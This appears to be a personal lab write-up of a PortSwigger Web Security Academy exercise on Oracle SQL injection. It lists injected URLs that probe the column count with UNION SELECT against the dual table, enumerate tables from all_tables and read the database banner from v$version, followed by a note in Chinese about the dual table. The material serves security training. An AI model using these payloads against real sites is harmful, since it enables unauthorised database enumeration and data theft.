https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

`https://0a6b009e0425c3fa8082eebc007a00af.web-security-academy.net/filter?category=' or 1 = 1 -- abc` --> OK

`https://0a6b009e0425c3fa8082eebc007a00af.web-security-academy.net/filter?category=' UNION SELECT NULL FROM dual -- abc` --> error

`https://0a6b009e0425c3fa8082eebc007a00af.web-security-academy.net/filter?category=' UNION SELECT NULL, NULL FROM dual -- abc` --> ok

`https://0a6b009e0425c3fa8082eebc007a00af.web-security-academy.net/filter?category=' UNION SELECT 'a', NULL FROM dual -- abc` --> ok

`https://0a6b009e0425c3fa8082eebc007a00af.web-security-academy.net/filter?category=' UNION SELECT table_name, NULL FROM all_tables -- abc`

`https://0a6b009e0425c3fa8082eebc007a00af.web-security-academy.net/filter?category=' UNION SELECT banner, NULL FROM v$version -- abc`

## Note
Oracle 中 SELECT 後面一定要有 FROM，為了讓 FROM 後面一定有東西接，所以有 `dual` table，基本上 `dual` 中保證只有一筆資料
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md
